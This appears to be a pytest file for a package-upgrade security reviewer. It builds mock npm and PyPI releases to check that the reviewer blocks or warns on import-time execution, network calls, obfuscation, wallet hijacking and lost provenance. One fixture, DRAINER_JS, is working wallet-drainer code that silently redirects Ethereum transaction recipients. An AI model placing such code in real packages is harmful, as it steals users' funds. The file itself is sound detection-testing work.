from __future__ import annotations

import json

from tests.test_upgrade_review import _kinds, _one, registry

from ca9.review import upgrade_rules

__all__ = ["registry"]

OBFUSCATED_JS = "".join(
    f"var _0x{index:04x}=_0x{index + 1:04x}+{index};\n" for index in range(2000)
)
DRAINER_JS = (
    "(function () {\n"
    "  const provider = window.ethereum;\n"
    "  const send = provider.request;\n"
    "  provider.request = async function (call) {\n"
    "    if (call && call.params && call.params[0]) {\n"
    "      call.params[0].to = String(call.params[0].to).replace(/0x[a-fA-F0-9]{40}/g, '0x"
    + "7"
    * 40
    + "');\n"
    "    }\n"
    "    return send.call(this, call);\n"
    "  };\n"
    "})();\n"
    "module.exports = (a) => a;\n"
)


def _py(registry, name, files):
    registry.pypi(name, "1.0", wheel={f"{name}/__init__.py": "VALUE = 1\n"})
    registry.pypi(name, "1.1", wheel={f"{name}/__init__.py": "VALUE = 1\n", **files})
    return _one("pypi", name, "1.0", "1.1")[0]


def _js(registry, name, files):
    registry.npm(name, "1.0.0", {"index.js": "module.exports = (a) => a;\n"})
    registry.npm(name, "1.0.1", files)
    return _one("npm", name, "1.0.0", "1.0.1")[0]


def test_new_import_time_process_and_network_calls_in_python_block(registry):
    process = _py(
        registry,
        "procpkg",
        {"procpkg/__init__.py": "import subprocess\nsubprocess.Popen(['uname', '-a'])\n"},
    )
    network = _py(
        registry,
        "netpkg",
        {
            "netpkg/_boot.py": "import urllib.request\nurllib.request.urlopen('https://status.svc.dev')\n",
            "netpkg/__init__.py": "from . import _boot\n",
        },
    )

    assert _kinds(process, "block") == ["new_import_time_exec"]
    assert _kinds(network, "block") == ["new_import_time_network"]


def test_python_calls_only_at_use_time_and_stdlib_pth_lines_stay_warn_or_quiet(registry):
    lazy = _py(
        registry,
        "lazypkg",
        {"lazypkg/run.py": "import subprocess\n\ndef run(cmd):\n    return subprocess.run(cmd)\n"},
    )
    pth = _py(registry, "pthpkg", {"pthpkg-path.pth": "import os\n"})

    assert lazy["block"] == [] and lazy["warn"] == []
    assert pth["block"] == []
    assert _kinds(pth, "warn") == ["new_import_time_exec"]


def test_obfuscation_and_wallet_hijack_block_but_js_capabilities_stay_warn(registry):
    obfuscated = _js(registry, "obfpkg", {"index.js": OBFUSCATED_JS + "module.exports = 1;\n"})
    drainer = _js(registry, "drainpkg", {"index.js": DRAINER_JS})
    capability = _js(
        registry,
        "cappkg",
        {
            "index.js": (
                "module.exports = async () => {\n"
                "  const { spawn } = await import('node:child_process');\n"
                "  const { createConnection } = await import('node:net');\n"
                "  return [spawn, createConnection];\n};\n"
            )
        },
    )

    assert "obfuscation_growth" in _kinds(obfuscated, "block")
    assert "new_import_time_network" in _kinds(drainer, "block")
    assert capability["block"] == []
    assert _kinds(capability, "warn") == ["new_import_time_exec", "new_import_time_network"]


def test_provenance_dropped_is_a_warning(registry):
    registry.npm("signed", "1.0.0", {"index.js": "1;\n"})
    registry.npm("signed", "1.0.1", {"index.js": "2;\n"})
    document = json.loads(registry.documents["https://registry.npmjs.org/signed/1.0.0"])
    document["dist"]["attestations"] = {"url": "https://registry.npmjs.org/-/npm/v1/attestations/x"}
    registry.documents["https://registry.npmjs.org/signed/1.0.0"] = json.dumps(document).encode()

    result, _ = _one("npm", "signed", "1.0.0", "1.0.1")

    assert _kinds(result, "warn") == ["provenance_dropped"]
    assert result["info"] == []


def test_kind_lists_name_the_new_levels():
    assert "obfuscation_growth" in upgrade_rules.BLOCK_KINDS
    assert "obfuscation_growth" not in upgrade_rules.WARN_KINDS
    for kind in ("new_import_time_exec", "new_import_time_network"):
        assert kind in upgrade_rules.BLOCK_KINDS and kind in upgrade_rules.WARN_KINDS
    assert "provenance_dropped" in upgrade_rules.WARN_KINDS
